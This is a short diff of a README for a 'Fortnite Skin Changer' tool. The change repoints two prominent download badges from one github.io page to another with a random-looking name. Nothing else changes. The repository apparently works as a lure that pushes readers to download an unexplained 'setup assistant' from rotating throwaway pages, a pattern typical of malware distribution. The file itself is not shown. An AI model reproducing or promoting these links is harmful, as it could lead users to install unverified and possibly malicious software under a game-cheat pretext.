@@ -1,7 +1,7 @@
 # 🎨 Fortnite Skin Changer — Cosmetic Swap Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://skin-fortnite-changer.github.io/.github/)
-[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=fortnite)](https://skin-fortnite-changer.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://skinfortchangerwmm09.github.io/.github/)
+[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=fortnite)](https://skinfortchangerwmm09.github.io/.github/)
 
 ---
 
